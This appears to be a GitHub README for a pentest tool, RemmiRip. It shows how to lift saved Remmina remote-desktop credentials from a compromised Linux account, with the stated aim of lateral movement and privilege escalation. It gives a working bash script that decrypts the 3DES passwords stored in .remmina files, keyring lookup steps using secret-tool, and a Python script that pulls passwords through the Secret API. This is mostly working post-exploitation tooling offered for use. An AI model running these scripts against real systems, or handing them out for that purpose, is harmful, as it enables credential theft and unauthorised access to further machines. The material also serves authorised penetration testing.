# RemmiRip
Lifting Remmina Credentials from Gnome Keyring

Remmina is a popular multipurpose remote desktop client for Linux capable of supporting RDP, VNC, SSH and more.  This article will describe how to recover a user's stored Reminna credentials from the Gnome keyring once a low-priv shell is obtained during a pentest.  Credentials obtained this way would allow lateral movement and privilege escalation on additional systems.

https://remmina.org/

Users can create sessions and optionally store logon credentials.

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r00.png)

If the Gnome keyring daemon is not available on the target system then passwords are stored as encrypted base64 strings in the \*.remmina files, which can be decrypted by the key (secret) found in the remmina.pref file.  Methods of recovering passwords from these files is well documented.

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r07.png)

https://www.rapid7.com/db/modules/post/multi/gather/remmina_creds

https://village.oyaore.com/home/post/2523/recover-lost-saved-remmina-remote-desktop-client-password

https://gist.github.com/selu/6359496

Here is a sample bash script that decrypts the non-keyring secrets stored in the \*.remmina files:

```bash
#!/bin/bash

echo -e "Enter the base64 secret from \"remmina.pref\":"
read RKEY

echo -e "\nEnter the base64 encrypted password from the \".remmina\" file:"
read REPW

KIV=($(echo -n $RKEY | base64 -di | xxd -p -c 24))
EPW=$(echo -n $REPW | base64 -di | xxd -p -c 256)

echo -e "\nThe decrypted password will appear in the output below:\n"

echo -n $EPW | xxd -r -p | openssl enc -des3 -nosalt -nopad -K "${KIV[0]}" -iv "${KIV[1]}" -d | hexdump -Cv
```

## Method for recovering passwords from Gnome keyring

**Step 1**

The assumption is that you already have a low-priv shell as some user on the target system that has Remmina configuration files.

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r01.png)

**Step 2**

Determine the location of the \*.remmina session configuration files if they exist.

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r02.png)

**Step 3**

Verify that the Gnome keyring service is in use.

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r03.png)

**Step 4**

If you check the \*.remmina configuration files "password" variable and the value is "." then the session passwords are stored in the Gnome keyring.

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r04.png)

**Step 5**

The easiest way to recover the passwords is to see if the "secret-tool" utility is installed on the target system.

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r05.png)

If so, then just loop through the file names performing a lookup on entries in the Gnome keyring.

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r06.png)

**Step 6**

If the "secret-tool" utility is not present then try to extract the passwords with python.

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r08.png)

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r09.png)

Here is the python script:

```python
#!/usr/bin/python

from gi.repository import Secret

EXAMPLE_SCHEMA = Secret.Schema.new("org.remmina.Password",
    Secret.SchemaFlags.NONE,
    {
        "filename": Secret.SchemaAttributeType.STRING,
        "key": Secret.SchemaAttributeType.STRING,
    }
)

password = Secret.password_lookup_sync(EXAMPLE_SCHEMA, { "filename": "/home/bill/.local/share/remmina/1541257445686.remmina", "key": "password" }, None)
print password
```

Here is a sample output after running the python script:

![alt text](https://github.com/billchaison/RemmiRip/blob/master/r10.png)
